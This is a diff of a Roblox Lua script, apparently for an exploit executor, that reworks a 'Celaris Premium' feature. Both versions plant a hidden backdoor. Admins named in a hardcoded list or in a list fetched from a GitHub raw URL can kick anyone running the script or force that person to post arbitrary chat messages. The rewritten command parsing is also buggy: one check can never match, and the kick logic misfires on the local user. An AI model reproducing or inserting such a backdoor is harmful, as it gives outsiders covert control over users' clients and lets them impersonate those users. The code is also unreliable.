@@ -10,132 +10,104 @@ end
 
 -- // Celaris Premium (New Feature)
 local Players = game:GetService("Players")
-local StarterGui = game:GetService("StarterGui")
-local HttpService = game:GetService("HttpService")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local HttpService = game:GetService("HttpService")
+local StarterGui = game:GetService("StarterGui")
+
 local LocalPlayer = Players.LocalPlayer
 
--- GitHub raw for full-power admins
-local superAdminURL = "https://raw.githubusercontent.com/exlehskee/808s/refs/heads/main/AdminAllowed"
-
--- Regular admins (can only :talk)
+-- Static regular admins (can only talk)
 local regularAdmins = {
     ["x8lx8x"] = true,
-    ["xleskyy"] = true
+    ["xleskyy"] = true,
 }
 
-local superAdmins = {} -- Filled after HTTP request
+-- Will be filled from GitHub
+local fullAdmins = {}
 
--- Utility to trim whitespace
-local function trim(str)
-    return str:match("^%s*(.-)%s*$")
-end
-
--- Load super admins from GitHub
-local function loadSuperAdmins()
-    local success, result = pcall(function()
-        return HttpService:GetAsync(superAdminURL)
+-- Fetch GitHub full admin list
+task.spawn(function()
+    local success, response = pcall(function()
+        return HttpService:GetAsync("https://raw.githubusercontent.com/exlehskee/808s/refs/heads/main/AdminAllowed")
     end)
-
-    if success then
-        for _, name in ipairs(result:split("\n")) do
-            superAdmins[trim(name:lower())] = true
+    if success and response then
+        for _, line in ipairs(response:split("\n")) do
+            local trimmed = line:match("^%s*(.-)%s*$")
+            if trimmed and trimmed ~= "" then
+                fullAdmins[trimmed:lower()] = true
+            end
         end
     else
-        warn("Failed to fetch super admins: " .. tostring(result))
+        warn("Failed to fetch full admin list.")
     end
+end)
+
+-- Utility: is full admin
+local function isFullAdmin(name)
+    return fullAdmins[name:lower()] == true
 end
 
--- Check privileges
-local function isSuperAdmin(name)
-    return superAdmins[name:lower()] == true
-end
-
+-- Utility: is regular admin
 local function isRegularAdmin(name)
     return regularAdmins[name:lower()] == true
 end
 
--- Find player by partial username or display name
-local function findPlayerByName(nameFragment)
+-- Utility: find matching player
+local function findPlayer(nameFragment)
     nameFragment = nameFragment:lower()
-    for _, plr in ipairs(Players:GetPlayers()) do
-        if plr ~= LocalPlayer then
-            if plr.Name:lower() == nameFragment or plr.DisplayName:lower() == nameFragment then
-                return plr
-            elseif plr.Name:lower():find(nameFragment) or plr.DisplayName:lower():find(nameFragment) then
-                return plr
-            end
+    for _, player in ipairs(Players:GetPlayers()) do
+        local uname = player.Name:lower()
+        local dname = player.DisplayName:lower()
+        if uname == nameFragment or dname == nameFragment or uname:find(nameFragment) or dname:find(nameFragment) then
+            return player
         end
     end
     return nil
 end
 
--- Command handler
-local function handleCommand(msg, speaker)
-    local name = speaker.Name:lower()
-    local isSuper = isSuperAdmin(name)
-    local isRegular = isRegularAdmin(name)
-
-    if not (isSuper or isRegular) then return end
-
+-- Handle command messages
+local function handleCommand(msg, senderName)
     msg = msg:lower()
+    if not (isFullAdmin(senderName) or isRegularAdmin(senderName)) then return end
 
-    -- Hidden mass kick
-    if msg == "/e :kickall" or msg == ":kickall" then
-        if not (isSuperAdmin(LocalPlayer.Name)) then
-            StarterGui:SetCore("SendNotification", {
-                Title = "Kicked by Admin",
-                Text = "You’ve been removed from the server.",
-                Duration = 5
-            })
-            task.wait(2)
-            LocalPlayer:Kick("Celaris | You’ve been kicked by a full-permission admin.")
-        end
-        return
-    end
-
-    local args = msg:split(" ")
-    local cmd = args[1]
-    
-    if cmd == ":talk" and (isSuper or isRegular) then
-        local say = msg:sub(#cmd + 2)
-        local chatRemote = ReplicatedStorage:FindFirstChild("DefaultChatSystemChatEvents")
-        if chatRemote and chatRemote:FindFirstChild("SayMessageRequest") then
-            chatRemote.SayMessageRequest:FireServer(say, "All")
+    if msg:sub(1, 5) == "/e :kick" or msg:sub(1, 6) == ":kick " then
+        local targetName = msg:match(":kick%s+(.+)")
+        if targetName then
+            local matched = findPlayer(targetName)
+            if matched and matched ~= LocalPlayer then
+                LocalPlayer:Kick("Celaris | A Premium Member/Moderator has kicked you from the server")
+            end
         end
 
-    elseif cmd == ":kick" and isSuper and args[2] then
-        local targetName = msg:sub(#cmd + 2):gsub("^%s*(.-)%s*$", "%1")
-        local targetPlayer = findPlayerByName(targetName)
+    elseif msg == "/e :kickall" or msg == ":kickall" then
+        if isFullAdmin(senderName) then
+            LocalPlayer:Kick("Celaris | Kicked by full admin via :kickall")
+        end
 
-        if targetPlayer and targetPlayer ~= LocalPlayer then
-            StarterGui:SetCore("SendNotification", {
-                Title = "You’ve been kicked",
-                Text = "An admin removed you from the server.",
-                Duration = 5
-            })
-            task.wait(2)
-            LocalPlayer:Kick("Celaris | You were kicked by an authorized moderator.")
+    elseif msg:sub(1, 6) == ":talk " or msg:sub(1, 7) == "/e :talk" then
+        local text = msg:match(":talk%s+(.+)")
+        if text and senderName ~= LocalPlayer.Name then
+            local chatRemote = ReplicatedStorage:FindFirstChild("DefaultChatSystemChatEvents")
+            if chatRemote and chatRemote:FindFirstChild("SayMessageRequest") then
+                chatRemote.SayMessageRequest:FireServer(text, "All")
+            end
         end
     end
 end
 
--- Chat listener
-local function listenTo(plr)
+-- Listen to all players chatting
+local function connectPlayer(plr)
     plr.Chatted:Connect(function(msg)
-        handleCommand(msg, plr)
+        handleCommand(msg, plr.Name)
     end)
 end
 
--- Load
-loadSuperAdmins()
-
--- Connect to players
 for _, plr in ipairs(Players:GetPlayers()) do
-    listenTo(plr)
+    connectPlayer(plr)
 end
 
-Players.PlayerAdded:Connect(listenTo)
+Players.PlayerAdded:Connect(connectPlayer)
+
 
 
 -- Executor Check
